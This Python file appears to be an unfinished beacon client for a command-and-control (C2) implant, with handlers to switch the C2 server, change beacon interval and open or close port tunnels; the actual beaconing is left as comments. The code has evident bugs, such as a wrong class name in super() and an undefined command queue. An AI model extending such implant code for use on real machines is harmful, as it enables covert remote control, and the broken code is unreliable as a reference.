import threading
import http
import command_types


class BeaconClient(threading.Thread):
    def __init__(self, master_queue, server_queue, client_queue):
        # `commands` is a Queue of commands from the main C2 client class
        super(ClientThread, self).__init__()
        self.endpoint = "http://localhost:5000/api/heartbeat/"
        self.master_queue = master_queue
        self.server_queue = server_queue
        self.client_queue = client_queue
        self.sleep_time = 24 * 60 * 60 * 1000    # 24 hours between beacons
        self.queued_errors = []  # Allows us to send errors back to C2 as part of the beacon

        self.stop_request = threading.Event()

    # The master queue is populated using the raw input from the beacon
    # This class then hands off those commands where necessary to the other threads
    def run(self):
        # We loop through all the commands that have not yet been handled on the master queue,
        # then grab the commands off the beacon response and action those,
        # then sleep for the configured period of time
        while not self.stop_request.is_set():
            while not self.master_queue.empty():
                command = self.master_queue.get(True, 0.05)
                self.handle_command(command)

            # Send the beacon out, then handle the commands in the response (if any)

            # Then sleep

    def handle_command(self, command):
        try:
            if command == command_types.CHANGE_C2:
                self.endpoint = self.master_queue.get(True, 0.05)

            elif command == command_types.SLEEP:
                self.sleep_time = self.master_queue.get(True, 0.05)

            elif (command == command_types.OPEN_TUNNEL) or (command == command_types.CLOSE_TUNNEL):
                forwardFromPort = self.commands.get(True, 0.05)
                toHost = self.commands.get(True, 0.05)
                toPort = self.commands.get(True, 0.05)
                self.client_queue.put(command, forwardFromPort, toHost, toPort)

        except:
            self.queued_errors.append("Commands malformed")
